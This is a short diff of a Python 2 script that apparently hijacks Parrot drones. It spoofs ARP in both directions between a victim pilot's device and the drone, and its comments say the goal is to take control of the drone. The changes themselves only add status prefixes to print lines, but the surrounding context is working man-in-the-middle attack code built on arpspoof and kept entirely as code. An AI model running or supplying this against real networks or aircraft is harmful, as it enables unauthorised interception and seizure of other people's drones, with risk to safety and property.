@@ -17,12 +17,13 @@ def scan_ips(local_ip):
 	time.sleep(3)	#small delay to be sure that arp tables are poisoned
 	#because if the victim pilot isn't poisoned, we will not have control of the drone (ONLY 1 PILOT X FLY)
 def stop_hijack():
+	print '[-] stopping hijacking'
 	os.popen("killall arpspoof")
 	time.sleep(2)	#wait for hosts re-arping
 
 def hijack(ip):
 	global PARROT_IP,net_interface
-	print 'hijacking "'+ip+'"'
+	print '[+] hijacking "'+ip+'"'
 	#Bidirectional hijacking
 	Popen(['arpspoof', '-i',net_interface,'-t',ip,PARROT_IP], stdout=PIPE, stderr=PIPE)	
 	Popen(['arpspoof', '-i',net_interface,'-t',PARROT_IP,ip], stdout=PIPE, stderr=PIPE)
